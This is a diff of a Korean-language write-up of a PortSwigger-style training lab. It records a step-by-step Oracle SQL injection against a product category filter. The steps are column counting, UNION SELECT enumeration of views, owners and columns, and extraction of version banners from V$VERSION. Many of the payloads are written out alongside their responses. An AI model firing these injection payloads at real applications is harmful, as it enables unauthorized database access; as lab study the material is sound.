@@ -10,125 +10,177 @@ draft: false
 
 # SQL injection attack, querying the database type and version on Oracle
 
-## 목표와 현재 상태
+실습 설명에서 필요한 버전 문자열은 알 수 있었지만, 어느 뷰에 저장됐는지는 몰랐다. 실제 첫 시도에서는 `OWNER`를 저장하지 않아 HTTP 500을 만났다. 아래는 **직접 확인한 결과를 바탕으로, 정답을 모르는 상태에서 다시 탐색할 때의 순서**로 정리했다. 당시의 500 시도는 끝에 따로 남겼다.
 
-상품 카테고리 필터의 SQL injection으로 Oracle 데이터베이스의 버전 문자열을 조회하는 실습이다. 첫 캡처에서는 버전 일부를 출력했지만 배지가 **Not solved**였다. 2026-09-30 새 인스턴스에서 목표 문자열 다섯 개를 조회하고 **Solved**를 확인했다.
+## 1. 반환 열 개수 확인
 
-## 확인한 과정
+`category`에 다음 값을 차례로 넣었다.
 
-1. `category`에 `' ORDER BY 1 --`, `' ORDER BY 2 --`, `' ORDER BY 3 --`을 차례로 넣었다. 세 번째 요청에서 `Internal Server Error`가 나와 반환 열을 2개로 판단했다.
-2. 첫 번째 열에 문자열을 표시할 수 있음을 다음 쿼리로 확인하고, `ALL_VIEWS`에서 뷰 이름을 조회했다.
+~~~sql
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+~~~
 
-   ```sql
-   ' UNION SELECT view_name, NULL FROM all_views --
-   ```
+1, 2는 처리됐고 3은 `Internal Server Error`였다. 원래 조회가 **두 열**을 반환한다고 판단했다. 이후 `UNION SELECT`에도 열을 두 개 두고, 필요하지 않은 두 번째 열은 `NULL`로 채웠다.
 
-   ![UNION SELECT로 뷰 이름을 조회한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)
+**다음 탐색:** 첫 번째 열에 문자열을 출력할 수 있는지와 버전 관련 뷰 이름을 확인한다.
 
-3. `ALL_TAB_COLUMNS`에서 버전 관련 뷰의 열 이름과 자료형을 확인했다. 저장한 `results.json`에는 `PRODUCT_COMPONENT_VERSION`의 `PRODUCT`, `VERSION`, `STATUS` 열이 있었다. 이 JSON은 **열 정보**이고 실제 버전 값은 아니다.
+## 2. 뷰 이름 탐색
 
-   ```sql
-   ' UNION SELECT column_name, data_type
-   FROM all_tab_columns
-   WHERE table_name = 'PRODUCT_COMPONENT_VERSION' --
-   ```
+~~~sql
+' UNION SELECT view_name, NULL FROM all_views --
+~~~
 
-   ![뷰의 열 이름과 자료형을 확인한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/02-column-names-and-data-types-json.png)
+뷰 이름이 응답에 표시됐다. 첫 번째 열에 문자열이 출력되고 두 열짜리 `UNION`이 동작한다는 것을 확인했다. 이 단계의 이름만으로는 **소유자와 열**을 알 수 없다.
 
-4. `PRODUCT_COMPONENT_VERSION`의 각 열을 조회해 `Oracle Database 11g Express Edition`과 `11.2.0.2.0`을 확인했다. 이후 제품명·버전·상태를 **한 쿼리에서 결합**해 첫 번째 출력 열에 표시했다. 두 번째 출력 열은 `NULL`로 맞췄다.
+![UNION SELECT로 뷰 이름을 조회한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)
 
-   ```sql
-   ' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
-   FROM PRODUCT_COMPONENT_VERSION --
-   ```
+**다음 탐색:** `ALL_TAB_COLUMNS`에서 소유자를 이름과 함께 수집한다.
 
-   응답에는 다음 네 행이 표시됐다.
+## 3. 소유자를 붙인 후보 객체 목록 만들기
 
-   ```text
-   NLSRTL | 11.2.0.2.0 | Production
-   Oracle Database 11g Express Edition | 11.2.0.2.0 | 64bit Production
-   PL/SQL | 11.2.0.2.0 | Production
-   TNS for Linux: | 11.2.0.2.0 | Production
-   ```
-
-   ![버전 정보 네 행과 Not solved 상태](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)
-
-## 첫 시도의 결과 분석
-
-이번 쿼리는 `PRODUCT_COMPONENT_VERSION`에서 같은 행의 `PRODUCT`, `VERSION`, `STATUS`를 결합해 **네 개의 구성 요소와 공통 버전 `11.2.0.2.0`을 화면에 표시했다.** 데이터베이스 버전 조회 자체는 성공했다.
-
-하지만 첫 캡처의 목표 문구와 당시 출력은 다르다.
-
-| 항목 | 첫 시도 출력과 목표 문자열의 차이 |
-| --- | --- |
-| Oracle Database, PL/SQL | 목표에는 `Release`와 ` - `가 들어간다. 현재 출력은 값 사이에 ` | `를 넣었다. |
-| TNS for Linux:, NLSRTL | 목표에는 `Version`과 ` - `가 들어간다. 현재 출력에는 이 단어가 없다. |
-| CORE | 목표에는 `CORE 11.2.0.2.0 Production`이 있지만 현재 네 행에는 `CORE`가 없다. |
-
-따라서 **이 캡처의 배지는 `Not solved`**다. 위 차이가 판정에 영향을 준 것으로 보이지만, 채점 로직 자체는 확인하지 않았다. 현재 조회에서 `CORE` 행이 없으므로 네 행의 구분자만 바꾸는 것으로 목표의 다섯 문자열을 모두 얻을 수는 없다.
-
-### 수집한 열 정보로 재탐색 (2026-09-30)
-
-앞서 저장한 `results.json`에서 문자열 열 후보 세 개를 골라 새 실습 인스턴스에서 다시 조회했다. 동일한 `category` 삽입 지점에 두 열짜리 `UNION ALL SELECT`를 사용했고, 세션 쿠키 값은 기록하지 않았다.
-
-| 조회 대상 | 문자열 열 직접 조회 | `COUNT(*)` 조회 |
-| --- | --- | --- |
-| `PRODUCT_COMPONENT_VERSION` | `PRODUCT`: HTTP 200, 제품명 네 행 | HTTP 200, `4` |
-| `GV_$VERSION` | `BANNER`: HTTP 500 | HTTP 500 |
-| `SM_$VERSION` | `VERSION_TEXT`: HTTP 500 | HTTP 500 |
-| `V_$VERSION` | `BANNER`: HTTP 500 | HTTP 500 |
-
-직접 조회와 행 수 확인에는 다음 형태를 썼다. `COUNT(*)` 대조군도 같은 구문으로 실행했다.
-
-```sql
-' UNION ALL SELECT "BANNER", NULL FROM "GV_$VERSION" --
-' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "GV_$VERSION" --
-' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "PRODUCT_COMPONENT_VERSION" --
-```
-
-세 후보의 오류 응답에는 `Internal Server Error`만 보였고 Oracle 오류 코드는 없었다. 대조군에서는 행 수 조회가 성공했으므로 `COUNT(*)` 구문 자체가 실패한 것은 아니다. 후보 세 곳은 문자열 열을 선택하지 않고 행 수만 요청해도 실패했다. 이 단계에서는 열 메타데이터에서 찾은 이름으로 직접 조회가 되는지 알 수 없었고, 500 응답만으로 원인을 구별할 수 없었다. 당시에는 목표 문자열 다섯 개와 `Solved` 상태를 확인하지 못했다.
-
-새 인스턴스에서도 같은 세션으로 정상 조회(`PRODUCT_COMPONENT_VERSION.PRODUCT`: HTTP 200), 알려진 오류 대조군(`ORDER BY 3`: HTTP 500), 후보 뷰 조회(`GV_$VERSION.BANNER`: HTTP 500)를 비교했다. 두 500 응답의 **전체 HTML 본문과 헤더**에서 `ORA-xxxxx`, `PLS-xxxxx`, `SQLSTATE`, `SQLException` 표식을 찾지 못했다. 둘 다 일반적인 `Internal Server Error` 화면을 반환했다. 따라서 현재 HTTP 응답만으로 Oracle 오류 번호를 확인하거나 두 실패 원인이 같은지 판정할 수 없다.
-
-### 소유자와 동의어를 확인해 해결 (2026-09-30)
-
-이전 열 목록에는 `OWNER`가 빠져 있었다. `ALL_TAB_COLUMNS`에서 `V_$VERSION.BANNER`의 소유자를, `ALL_SYNONYMS`에서 해당 뷰를 가리키는 동의어를 조회했다.
-
-```sql
-' UNION ALL SELECT OWNER || '.' || TABLE_NAME, NULL
+~~~sql
+' UNION SELECT OWNER || '.' || TABLE_NAME, NULL
 FROM ALL_TAB_COLUMNS
-WHERE TABLE_NAME = 'V_$VERSION' AND COLUMN_NAME = 'BANNER' --
+WHERE TABLE_NAME LIKE '%VERSION%' --
+~~~
 
-' UNION ALL SELECT SYNONYM_NAME || ' => ' || TABLE_OWNER || '.' || TABLE_NAME, NULL
+실습 목표가 버전 문자열이므로 우선 이름에 `VERSION`이 포함된 객체로 범위를 좁혔다. 실제 응답은 HTTP 200, **서로 다른 객체 9개**였다. 그중 탐색 후보는 `SYS.PRODUCT_COMPONENT_VERSION`, `SYS.GV_$VERSION`, `SYS.SM_$VERSION`, `SYS.V_$VERSION`이었다. 필요하면 `WHERE`를 없애 더 넓게 열거할 수 있다.
+
+`ALL_TAB_COLUMNS`에는 객체마다 여러 열이 있으므로, `UNION ALL SELECT OWNER || '.' || TABLE_NAME`으로만 출력하면 같은 객체명이 열 수만큼 반복된다. 이 목록 조회에는 중복을 제거하는 `UNION SELECT`를 사용했다.
+
+**다음 탐색:** 각 후보의 열 이름과 자료형을 소유자 정보와 함께 확인한다.
+
+## 4. 문자열 열 후보 추리기
+
+~~~sql
+' UNION SELECT OWNER || '.' || TABLE_NAME || '.' ||
+               COLUMN_NAME || ' : ' || DATA_TYPE, NULL
+FROM ALL_TAB_COLUMNS
+WHERE TABLE_NAME IN (
+  'PRODUCT_COMPONENT_VERSION', 'GV_$VERSION',
+  'SM_$VERSION', 'V_$VERSION'
+) --
+~~~
+
+HTTP 200 응답에서 열 정보 9개를 확인했다. 데이터 출력에 쓸 문자열 열은 다음과 같았다.
+
+| 소유자 포함 객체 | 문자열 열 |
+| --- | --- |
+| `SYS.PRODUCT_COMPONENT_VERSION` | `PRODUCT`, `VERSION`, `STATUS` (`VARCHAR2`) |
+| `SYS.GV_$VERSION` | `BANNER` (`VARCHAR2`) |
+| `SYS.SM_$VERSION` | `VERSION_TEXT` (`CHAR`) |
+| `SYS.V_$VERSION` | `BANNER` (`VARCHAR2`) |
+
+`GV_$VERSION.INST_ID`와 `SM_$VERSION.VERSION_NUMBER`는 숫자, `SM_$VERSION.CREATED`는 날짜여서 문자열 열 반복 조회 대상에서 뺐다. 열 메타데이터는 값 자체가 아니므로 이제 각 후보에서 데이터를 읽어야 한다.
+
+![뷰의 열 이름과 자료형을 확인한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/02-column-names-and-data-types-json.png)
+
+**다음 탐색:** 의미가 분명한 제품·버전·상태부터 조회하고 목표와 비교한다.
+
+## 5. 제품 버전 정보 조회
+
+같은 원본 행의 세 값을 한 문자열로 결합했다. 열별로 따로 요청한 CSV의 행 번호를 임의로 짝짓지 않기 위해서다.
+
+~~~sql
+' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
+FROM PRODUCT_COMPONENT_VERSION --
+~~~
+
+실제 응답은 다음 네 행이었다.
+
+~~~text
+NLSRTL | 11.2.0.2.0 | Production
+Oracle Database 11g Express Edition | 11.2.0.2.0 | 64bit Production
+PL/SQL | 11.2.0.2.0 | Production
+TNS for Linux: | 11.2.0.2.0 | Production
+~~~
+
+버전 번호는 확인했지만 화면은 **Not solved**였다. 실습 설명의 다섯 문자열 중 `CORE 11.2.0.2.0 Production`이 없었다. 네 행의 구분자만 바꾸는 것으로는 빠진 행을 만들 수 없으므로 다른 문자열 열을 탐색했다.
+
+![버전 정보 네 행과 Not solved 상태](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)
+
+**다음 탐색:** 4단계에서 확인한 버전 관련 문자열 열을 소유자 포함 이름으로 차례로 조회한다.
+
+## 6. 소유자 포함 이름으로 후보 열 반복 조회
+
+먼저 열 내용과 무관하게 `FROM` 대상이 조회되는지 `COUNT(*)`로 확인하고, 성공한 객체의 문자열 열을 읽었다. 실제 요청은 다음 형태에서 `OWNER`, `VIEW`, `COLUMN`을 4단계 결과로 치환했다.
+
+~~~sql
+' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL
+FROM "<OWNER>"."<VIEW>" --
+
+' UNION ALL SELECT "<COLUMN>", NULL
+FROM "<OWNER>"."<VIEW>" --
+~~~
+
+| 조회 대상 | 행 수 조회 | 문자열 열 조회 |
+| --- | --- | --- |
+| `SYS.GV_$VERSION.BANNER` | HTTP 200, 5행 | HTTP 200, 목표 문자열 5개 |
+| `SYS.SM_$VERSION.VERSION_TEXT` | HTTP 200, 1행 | HTTP 200, `7.3.2.0.0` |
+| `SYS.V_$VERSION.BANNER` | HTTP 200, 5행 | HTTP 200, 목표 문자열 5개 |
+
+`BANNER`가 있는 두 뷰에서 설명에 나온 다섯 문자열을 모두 얻었고, `VERSION_TEXT` 한 행은 목표 버전과 다르다는 것을 확인했다. 여기까지는 **저장한 메타데이터에서 후보를 골라 실제 값으로 검증한 결과**다.
+
+**다음 탐색:** 앞서 생긴 500의 원인을 비교하고, 확인된 객체를 더 간단한 이름으로 부를 수 있는지 살핀다.
+
+## 7. 당시 500을 만든 누락과 이름 비교
+
+실제 첫 반복에서는 `results.json`에 `OWNER`를 저장하지 않아 다음처럼 뷰 이름만 `FROM`에 썼다.
+
+~~~sql
+' UNION ALL SELECT "BANNER", NULL FROM "V_$VERSION" --
+' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "V_$VERSION" --
+~~~
+
+둘 다 HTTP 500이었다. 같은 `COUNT(*)` 구문은 `PRODUCT_COMPONENT_VERSION`에서 HTTP 200과 `4`를 반환했다. 500 응답의 전체 HTML과 헤더에는 `Internal Server Error`만 있고 Oracle 오류 번호는 없었다. 이 응답만으로 원인을 확정하지 않고 **소유자 없는 이름과 소유자 포함 이름**을 비교했다.
+
+~~~sql
+' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "V_$VERSION" --
+' UNION ALL SELECT TO_CHAR(COUNT(*)), NULL FROM "SYS"."V_$VERSION" --
+~~~
+
+첫 번째는 HTTP 500, 두 번째는 HTTP 200과 `5`였다. 같은 대상이 소유자를 붙이면 읽히므로, 이 500은 `V_$VERSION`을 소유자 없이 참조한 데서 생겼다고 판단했다. 정확한 `ORA-` 번호는 서버 응답에서 확인할 수 없었다.
+
+더 짧은 이름이 있는지도 메타데이터에서 찾았다.
+
+~~~sql
+' UNION ALL SELECT SYNONYM_NAME || ' => ' ||
+                   TABLE_OWNER || '.' || TABLE_NAME, NULL
 FROM ALL_SYNONYMS
 WHERE TABLE_NAME = 'V_$VERSION' --
-```
+~~~
 
-응답은 각각 `SYS.V_$VERSION`, `V$VERSION => SYS.V_$VERSION`이었다. 같은 세션에서 행 수만 비교했다.
+응답은 `V$VERSION => SYS.V_$VERSION`이었다. `V$VERSION`에서 행 수를 조회해도 HTTP 200과 `5`가 나왔다.
 
-| `FROM` 대상 | 결과 |
-| --- | --- |
-| `"V_$VERSION"` | HTTP 500 |
-| `"SYS"."V_$VERSION"` | HTTP 200, 5행 |
-| `V$VERSION` | HTTP 200, 5행 |
+**다음 탐색:** 확인된 동의어에서 `BANNER`를 출력하고 실습 판정을 확인한다.
 
-소유자를 붙이거나 조회된 동의어를 쓰면 성공하므로, **`V_$VERSION`을 소유자 없이 사용한 이름 해석이 이 500의 원인**이라고 판단했다. 문자 열의 자료형이나 조회 권한 자체 때문에 실패한 것은 아니었다. 다만 서버가 원래 Oracle 오류 코드를 숨기므로 정확한 `ORA-` 번호는 확인하지 못했다. 다른 두 후보 뷰에도 같은 원인이 적용되는지는 별도로 검증하지 않았다.
+## 8. 목표 문자열과 실습 판정 확인
 
-마지막으로 동의어에서 `BANNER`를 조회했다.
-
-```sql
+~~~sql
 ' UNION ALL SELECT BANNER, NULL FROM V$VERSION --
-```
+~~~
 
-HTTP 200 응답에 목표 문자열 다섯 개가 모두 표시됐고, 이어서 응답과 홈 화면 모두 `LAB Solved`를 표시했다. 이 과정은 저장한 열 메타데이터에서 소유자와 동의어를 추적해 검증한 결과다.
+HTTP 200 응답에 다음 다섯 행이 나왔다.
 
+~~~text
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+CORE 11.2.0.2.0 Production
+TNS for Linux: Version 11.2.0.2.0 - Production
+NLSRTL Version 11.2.0.2.0 - Production
+~~~
 
-## 배운 점
+요청 직후 응답과 홈 화면이 모두 **LAB Solved**를 표시했다. 다른 두 후보도 소유자 없는 이름에서는 500, 소유자를 붙인 이름에서는 200이었다. 다만 서버가 숨긴 정확한 Oracle 오류 번호는 확인하지 못했다.
 
-- `PRODUCT_COMPONENT_VERSION`의 `PRODUCT`, `VERSION`, `STATUS`를 함께 선택하면 같은 원본 행의 값이 한 줄에 표시된다. 앞선 CSV처럼 열마다 따로 요청한 뒤 행 번호로 맞추는 방식은 원본 행의 대응을 보장하지 않는다.
-- Oracle의 `PRODUCT_COMPONENT_VERSION`은 제품과 구성 요소의 버전 정보를 제공한다. **버전 정보 노출**과 **실습 Solved 판정**은 별도로 확인해야 한다.
-- 시스템 뷰의 열을 메타데이터에서 찾았다면 `OWNER`와 동의어도 확인한다. 소유자 없는 뷰 이름이 실패해도, 소유자를 붙인 이름이나 동의어는 성공할 수 있다.
+## 핵심
+
+- 후보를 반복 조회하기 **전에** `OWNER`를 함께 수집한다. 열만 수집한 뒤 소유자를 빼고 `FROM`에 넣으면, 실제로 접근 가능한 뷰도 500으로 보일 수 있다.
+- `COUNT(*)` 대조 조회로 뷰 참조 문제와 문자열 열 선택 문제를 나눈다.
+- HTTP 500은 Oracle 오류 코드가 아니다. 이번 원인은 서로 다른 이름으로 같은 객체를 조회해 비교한 결과로 좁혔다.
 
 ## 참고
 
 - [Oracle: PRODUCT_COMPONENT_VERSION으로 릴리스 확인](https://docs.oracle.com/cd/B28359_01/server.111/b28310/dba004.htm)
+- [Oracle: ALL_TAB_COLUMNS의 OWNER 열](https://docs.oracle.com/cd/E18283_01/server.112/e17110/statviews_2103.htm)
